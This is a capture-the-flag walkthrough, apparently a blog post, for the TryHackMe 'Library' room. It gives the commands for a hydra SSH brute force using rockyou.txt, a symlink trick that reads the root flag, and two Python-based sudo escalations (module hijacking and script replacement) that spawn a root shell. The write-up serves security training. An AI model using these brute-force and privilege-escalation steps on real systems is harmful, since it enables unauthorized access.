---
title: Library
description: 'Brute forcing SSH access and escalating using a poorly configured sudo rule'
pubDate: 2024-12-27
category: 'tryhackme'
tags: []
image: 'https://tryhackme-images.s3.amazonaws.com/room-icons/484c37bcb5b90fac35d15f0c5ccdaed6.jpeg'
---

From the website we get a username `meliodas` and checking the `robots.txt` we see it contains a reference to `rockyou`.txt probably.

## USER

Lets try to brute force SSH with that username (`meliodas`) and `rockyou.txt`.

```bash
hydra -l meliodas -P /usr/share/wordlists/rockyou.txt 10.10.203.120 ssh -t 4
...[snip]...
[STATUS] 104.00 tries/min, 104 tries in 00:01h, 14344295 to do in 2298:46h, 4 active
[22][ssh] host: 10.10.203.120   login: meliodas   password: iloveyou1
...[snip]...
```

We can SSH in to the machine with these credentials:

```bash
ssh meliodas@10.10.203.120 # <-- iloveyou1
```

## ROOT

Checking for sudo privileges we see an interestings python script.

```bash
sudo -l
Matching Defaults entries for meliodas on ubuntu:
...[snip]...

User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
```
Looking at the script we see that it makes a backup of the website and creates a zip (`/var/backups/website.zip`).

We have write access to the website directory so we can create a symlink to any file in there. Run the backup and extract it to a location we have access to, and read the symlinked file:

```bash
ln -s /root/root.txt moo
sudo /usr/bin/python3 /home/meliodas/bak.py
cp /var/backups/website.zip /tmp/
cd /tmp
unzip website.zip
cd /tmp/var/www/html/Blog
cat moo
```
And we get the root flag.

An other way is to create our own 'zipfile' python file.

Lets create a `zipfile.py`.

```python
import pty

pty.spawn('bash')
```

Execute the script with `sudo`:

```bash
meliodas@ubuntu:~$ sudo /usr/bin/python3 /home/meliodas/bak.py
root@ubuntu:~# id
uid=0(root) gid=0(root) groups=0(root)
```

And we get a root shell.

Yet another way is to just remove the `bak.py` file completely and create a new `bak.py` file with our own code.

Remove the old `bak.py` file which is owned by `root`:

```bash
rm bak.py
rm: remove write-protected regular file 'bak.py'? y
```

Our new `bak.py`:

```python
import pty

pty.spawn('bash')
```

Run the script with sudo:

```bash
sudo /usr/bin/python3 /home/meliodas/bak.py
root@ubuntu:~# id
uid=0(root) gid=0(root) groups=0(root)
```
